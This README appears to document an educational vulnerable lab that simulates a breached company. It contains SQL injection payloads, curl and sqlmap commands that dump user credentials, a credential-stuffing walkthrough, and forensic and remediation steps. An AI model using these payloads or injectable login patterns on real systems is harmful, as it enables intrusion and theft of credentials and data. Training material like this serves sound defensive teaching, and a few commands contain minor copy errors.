# TechSolutions S.A. - Security Lab & Honeypot

🔒 **Educational Security Lab** - A simulated vulnerable environment for cybersecurity training and forensic analysis.

## 📋 Table of Contents

- [Overview](#overview)
- [Lab Setup](#lab-setup)
- [Architecture](#architecture)
- [Vulnerabilities Catalog](#vulnerabilities-catalog)
- [Forensic Analysis Guide](#forensic-analysis-guide)
- [Exploitation Scenarios](#exploitation-scenarios)
- [Remediation](#remediation)

## 🎯 Overview

TechSolutions S.A. is a simulated medium-sized software company with a deliberately vulnerable infrastructure for security training purposes. This lab contains **5 critical security issues** commonly found in real-world environments:

1. **Public S3 Bucket** - Exposed database backups
2. **SQL Injection** - Vulnerable login form
3. **Compromised Credentials** - Leaked admin access
4. **Ransomware Attack** - Encrypted servers with forensic artifacts
5. **Data Leaks** - Client information on dark web forums

## 🚀 Lab Setup

### Prerequisites

- Docker & Docker Compose installed
- Node.js 18+ and npm
- Git
- At least 2GB RAM available
- Basic understanding of networking and cybersecurity

### Quick Start

```bash
# Clone the repository
git clone https://github.com/yourusername/techsolutions-lab.git
cd techsolutions-lab

# Start the lab environment
docker-compose up -d

# Initialize the database
npm run init-db

# Start the vulnerable web application
npm run dev
```

### Accessing the Lab

- **Web Application**: http://techsolutions.com.test:3000
- **Database**: localhost:3306 (user: `root`, password: `vulnerable123`)
- **S3 Bucket (simulated)**: `./s3-bucket/` directory

### DNS Configuration

Add the following to your `/etc/hosts` file:

```
127.0.0.1   techsolutions.com.test
127.0.0.1   www.techsolutions.com.test
127.0.0.1   admin.techsolutions.com.test
```

On Windows, edit `C:\Windows\System32\drivers\etc\hosts`

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────┐
│                   TechSolutions Lab                      │
├─────────────────────────────────────────────────────────┤
│                                                           │
│  ┌──────────────┐    ┌──────────────┐    ┌───────────┐ │
│  │ Web App      │───▶│ MySQL DB     │    │ S3 Bucket │ │
│  │ (Express/TS) │    │ (Vulnerable) │    │ (Public)  │ │
│  │ Port: 3000   │    │ Port: 3306   │    │ /s3-bucket│ │
│  └──────────────┘    └──────────────┘    └───────────┘ │
│         │                                                 │
│         ▼                                                 │
│  ┌──────────────────────────────────────────────────┐   │
│  │              Logging System                       │   │
│  │  - Authentication logs (AUTH_*.log)              │   │
│  │  - Network traffic (NET_*.log)                   │   │
│  │  - Ransomware indicators (RANSOM_*.log)          │   │
│  └──────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
```

## 🐛 Vulnerabilities Catalog

### 1. Public S3 Bucket (High Severity)

**Location**: `s3-bucket/backups/`

**Description**: Database backup files are publicly accessible without authentication.

**Files Exposed**:
- `db_backup_2025-10-15.sql` - Complete database dump
- `customer_data_export.csv` - Customer PII
- `payment_records.json` - Payment information
- `credentials.txt` - Hardcoded credentials

**Risk**: Complete data breach, regulatory violations (GDPR, PCI-DSS)

### 2. SQL Injection (Critical Severity)

**Location**: POST `/api/login`

**Vulnerable Code**: `src/routes/auth.ts`

**Payload Examples**:
```sql
# Basic boolean-based injection
Username: admin' OR 1=1-- 
Password: anything

# Comment-based injection
Username: admin'-- 
Password: (empty)

# Union-based injection
Username: ' UNION SELECT 1,username,password,email,role,created_at,updated_at FROM users-- 
Password: (empty)

# Alternative boolean injection
Username: admin' OR 'x'='x
Password: anything
```

**Risk**: Full database extraction, authentication bypass, data manipulation

### 3. Compromised Administrator Credentials

**Leaked Credentials**:
- Username: `carlos.admin@techsolutions.com`
- Password: `TechSol2024!Admin`
- Found in: External breach database (simulated in `s3-bucket/breaches/`)

**Access Level**: Full administrative privileges

**Risk**: Unauthorized access, privilege escalation, lateral movement

### 4. Ransomware Attack

**Affected Files**: `ransomware/encrypted/`

**Indicators**:
- File extension: `.locked`
- Ransom note: `README_DECRYPT.txt`
- Encryption timestamp: 2025-10-27 03:00:00 UTC
- Entry vector: Phishing email with malicious attachment

**Forensic Artifacts**:
- Initial access logs in `logs/AUTH_2025-10-27T10:01:32.log`
- Network connections in `logs/NET_2025-10-27T03:14:55.log`
- Process execution traces
- Registry modifications (simulated)

**Risk**: Business disruption, data loss, ransom payment

### 5. Data Leaks on Dark Web Forums

**Location**: `dark-web-leaks/forum_posts.txt`

**Leaked Information**:
- 1,247 customer records
- Credit card numbers (last 4 digits)
- Email addresses and phone numbers
- Internal employee data

**Origin**: Combination of S3 bucket exposure and SQL injection exploitation

## 🔍 Forensic Analysis Guide

### Step 1: Initial Triage

```bash
# Check running containers
docker-compose ps

# Review recent logs
tail -f logs/*.log

# Check database connections
docker exec -it techsolutions-db mysql -u root -pvulnerable123 -e "SHOW PROCESSLIST;"
```

### Step 2: Analyze Authentication Logs

```bash
# Extract failed login attempts
grep "Failed login" logs/AUTH_*.log | wc -l

# Identify suspicious IPs
grep "Failed login" logs/AUTH_*.log | awk '{print $5}' | sort | uniq -c | sort -nr

# Timeline of admin access
grep "carlos.admin" logs/AUTH_*.log | sort

# Look for SQL injection patterns
grep -E "(UNION|SELECT|'--)" logs/AUTH_*.log
```

**Expected Findings**:
- Multiple failed logins from IP: `45.142.214.198` (suspicious)
- Successful admin login from unusual location: `185.220.101.47` (Tor exit node)
- SQL injection attempts between 02:00-03:00 UTC on 2025-10-27
- Pattern of enumeration attempts before successful breach

### Step 3: Network Traffic Analysis

```bash
# Analyze network logs
cat logs/NET_*.log

# Find data exfiltration
grep -E "(UPLOAD|POST|PUT)" logs/NET_*.log | grep -v "localhost"

# Identify C2 communication
grep -E "23.95.112|45.142.214" logs/NET_*.log

# Check for unusual ports
awk '{print $7}' logs/NET_*.log | sort | uniq -c
```

**Expected Findings**:
- Large data transfer to IP: `23.95.112.34:443` (1.2 GB)
- Connection to known malicious domain: `c2.ransomgang.onion`
- Periodic beacons every 60 seconds to C2 server
- Database dump download: 347 MB at 2025-10-27 02:47:33

### Step 4: Database Forensics

```bash
# Connect to database
docker exec -it techsolutions-db mysql -u root -pvulnerable123 techsolutions

# Check for unauthorized queries
SELECT * FROM mysql.general_log WHERE command_type = 'Query' AND argument LIKE '%UNION%';

# Identify data access patterns
SELECT user, COUNT(*) as queries FROM mysql.general_log GROUP BY user;

# Look for created backdoor accounts
SELECT * FROM users WHERE created_at > '2025-10-26' ORDER BY created_at DESC;

# Check for privilege escalation
SELECT * FROM users WHERE role = 'admin' ORDER BY updated_at DESC;
```

**Expected Findings**:
- Backdoor user created: `backup_svc` with admin privileges
- 1,247 customer records accessed via SQL injection
- Bulk export queries executed at 02:45 UTC
- Modified admin password for persistence

### Step 5: S3 Bucket Investigation

```bash
# List all files in simulated S3 bucket
ls -laR s3-bucket/

# Check file access times
find s3-bucket/ -type f -printf '%T+ %p\n' | sort

# Identify sensitive data
grep -r "password\|credit\|ssn" s3-bucket/

# Check for unauthorized modifications
git log --all --full-history -- s3-bucket/
```

**Expected Findings**:
- Last access: 2025-10-26 23:15:44 from IP: `45.142.214.198`
- Downloaded files: `db_backup_2025-10-15.sql`, `customer_data_export.csv`
- 3 unauthorized access attempts before successful download
- Files indexed by search engines (Google, Shodan)

### Step 6: Ransomware Analysis

```bash
# Examine ransom note
cat ransomware/README_DECRYPT.txt

# List encrypted files
find ransomware/encrypted/ -name "*.locked"

# Check for encryption markers
hexdump -C ransomware/encrypted/important_doc.pdf.locked | head

# Timeline reconstruction
stat ransomware/encrypted/*.locked

# Look for dropper artifacts
grep "ransomware\|encrypt\|.exe" logs/*.log
```

**Expected Findings**:
- Encryption started: 2025-10-27 03:14:22 UTC
- Entry vector: Phishing email attachment `Invoice_Q3_2025.pdf.exe`
- Ransomware family: `LockBit 3.0` (simulated)
- Bitcoin wallet for ransom: `1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa`
- Encryption key: AES-256 with RSA-2048 key exchange
- Total files encrypted: 847 files across 3 servers

### Step 7: Dark Web Leak Analysis

```bash
# Review leaked data
cat dark-web-leaks/forum_posts.txt

# Match leaked data with database
npm run check-leaks

# Timeline correlation
npm run correlate-timeline
```

**Expected Findings**:
- Data posted on: 2025-10-28 (1 day after ransomware)
- Forum: RaidForums mirror
- Seller: `DataBroker2025`
- Price: 0.5 BTC (~$25,000)
- Data matches S3 bucket + SQL injection extraction

### Step 8: Create Timeline of Attack

```bash
# Generate complete timeline
npm run generate-timeline

# Output: attack-timeline.md
```

**Complete Attack Timeline**:

```
2025-10-26 18:30:00 - Reconnaissance: Port scanning from 45.142.214.198
2025-10-26 19:45:12 - Discovery: S3 bucket found via Shodan
2025-10-26 23:15:44 - Exfiltration: S3 bucket downloaded (1.8 GB)
2025-10-27 01:30:00 - Exploitation: SQL injection attempts begin
2025-10-27 02:47:33 - Exfiltration: Database dump extracted (347 MB)
2025-10-27 03:00:15 - Initial Access: Phishing email with ransomware opened
2025-10-27 03:14:22 - Impact: Ransomware encryption begins
2025-10-27 06:30:00 - Discovery: IT team notices encrypted files
2025-10-27 10:01:32 - Response: Incident response initiated
2025-10-28 15:00:00 - Data Leak: Customer data posted on dark web forum
```

## 🎮 Exploitation Scenarios

### Scenario 1: SQL Injection Attack

**Objective**: Extract all user credentials from the database

**Steps**:

1. **Identify the injection point**:
```bash
curl -X POST http://techsolutions.com.test:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test"}'
```

2. **Test for SQL injection**:
```bash
curl -X POST http://techsolutions.com.test:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR 1=1-- ","password":"anything"}'
  -d '{"username":"admin'\'' OR 1=1-- ","password":"anything"}'

# Using PowerShell (Windows):
# Create payload file first:
echo '{"username":"admin'\'' OR 1=1-- ","password":"anything"}' > payload.json
Invoke-WebRequest -Uri "http://techsolutions.com.test:3000/api/auth/login" `
  -Method POST -ContentType "application/json" -InFile "payload.json"
```

3. **Extract database structure**:
```bash
# Get table names
curl -X POST http://techsolutions.com.test:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"'\'' UNION SELECT 1,table_name,2,3,4,5,6 FROM information_schema.tables WHERE table_schema=database()-- ","password":""}'
```

4. **Dump user credentials**:
```bash
curl -X POST http://techsolutions.com.test:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"'\'' UNION SELECT 1,username,password,email,role,created_at,updated_at FROM users-- ","password":""}'
```

5. **Automate with SQLMap**:
```bash
sqlmap -u "http://techsolutions.com.test:3000/api/login" \
  --data='{"username":"test","password":"test"}' \
  --method=POST \
  --dbms=mysql \
  --dump
```

### Scenario 2: S3 Bucket Exploitation

**Objective**: Access and download sensitive backup files

**Steps**:

1. **List bucket contents**:
```bash
ls -la s3-bucket/backups/
```

2. **Download database backup**:
```bash
cp s3-bucket/backups/db_backup_2025-10-15.sql ./
```

3. **Extract credentials**:
```bash
grep -i "password\|secret\|key" db_backup_2025-10-15.sql
```

4. **Analyze customer data**:
```bash
cat s3-bucket/backups/customer_data_export.csv | wc -l
head -20 s3-bucket/backups/customer_data_export.csv
```

### Scenario 3: Credential Stuffing Attack

**Objective**: Use compromised credentials for unauthorized access

**Steps**:

1. **Obtain leaked credentials**:
```bash
cat s3-bucket/breaches/external_breach.txt | grep "techsolutions.com"
```

2. **Test credentials**:
```bash
curl -X POST http://techsolutions.com.test:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"carlos.admin@techsolutions.com","password":"TechSol2024!Admin"}'
```

3. **Access admin panel**:
```bash
# Use obtained session token
curl -X GET http://techsolutions.com.test:3000/api/admin/users \
  -H "Authorization: Bearer <token_from_step_2>"
```

### Scenario 4: Ransomware Forensics

**Objective**: Analyze ransomware behavior and identify IOCs

**Steps**:

1. **Examine ransom note**:
```bash
cat ransomware/README_DECRYPT.txt
```

2. **Identify encrypted files**:
```bash
find ransomware/encrypted/ -name "*.locked" -exec file {} \;
```

3. **Extract encryption metadata**:
```bash
npm run analyze-ransomware
```

4. **Search for IOCs**:
```bash
# File hashes
md5sum ransomware/dropper/Invoice_Q3_2025.pdf.exe

# Network indicators
grep -E "C2|command|control" logs/NET_*.log
```

5. **Attempt recovery**:
```bash
# Note: In real scenarios, recovery depends on ransomware variant
npm run simulate-recovery
```

## 🛡️ Remediation

### Fix 1: Secure S3 Bucket

```bash
# In production AWS:
aws s3api put-bucket-acl --bucket techsolutions-backups --acl private
aws s3api put-public-access-block --bucket techsolutions-backups \
  --public-access-block-configuration \
  "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"
```

### Fix 2: Patch SQL Injection

See `src/routes/auth.secure.ts` for the patched version using parameterized queries.

### Fix 3: Reset Compromised Credentials

```sql
-- Revoke compromised admin access
UPDATE users SET password = SHA2('NewSecurePassword123!', 256), 
                 force_password_change = 1 
WHERE username = 'carlos.admin@techsolutions.com';

-- Enable MFA for all admin accounts
UPDATE users SET mfa_enabled = 1 WHERE role = 'admin';
```

### Fix 4: Ransomware Prevention

- Implement email filtering and sandboxing
- Deploy EDR solution
- Regular offline backups (3-2-1 rule)
- Network segmentation
- Application whitelisting

### Fix 5: Data Leak Response

- Notify affected customers (GDPR requirement)
- Offer credit monitoring services
- Report to data protection authority
- Conduct security audit
- Implement DLP solution

## 📚 Learning Objectives

After completing this lab, you should be able to:

- ✅ Identify and exploit common web application vulnerabilities
- ✅ Perform forensic analysis on compromised systems
- ✅ Correlate multiple data sources to build attack timelines
- ✅ Understand the kill chain of a multi-stage attack
- ✅ Implement security controls and remediation strategies
- ✅ Write comprehensive incident response reports

## ⚠️ Legal Disclaimer

This lab is for **EDUCATIONAL PURPOSES ONLY**. Do not use these techniques against systems you do not own or have explicit permission to test. Unauthorized access to computer systems is illegal and punishable by law.

## 🤝 Contributing

Contributions are welcome! Please feel free to submit pull requests to add new scenarios or improve existing ones.

## 📝 License

MIT License - See LICENSE file for details

## 🔗 Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [SANS Digital Forensics](https://www.sans.org/cyber-security-courses/advanced-incident-response-threat-hunting-training/)

---

**Created for educational purposes by the cybersecurity community** 🛡️
